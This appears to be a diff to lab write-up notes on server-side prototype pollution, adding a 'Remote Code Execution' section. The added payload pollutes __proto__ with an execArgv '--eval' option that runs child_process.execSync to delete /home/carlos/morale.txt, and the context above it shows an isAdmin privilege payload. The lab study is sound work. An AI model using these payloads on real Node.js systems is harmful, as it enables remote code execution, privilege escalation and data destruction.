@@ -17,3 +17,15 @@ Click Exploit again. In the new tab that loads, append a minus character (-) to 
     "isAdmin":"true"
 }}
 ```
+
+=========================================READ CARLOS/SECRET============================================
+
+## Remote Code Execution
+
+```
+"__proto__": {
+    "execArgv":[
+        "--eval=require('child_process').execSync('rm /home/carlos/morale.txt')"
+    ]
+}
+```
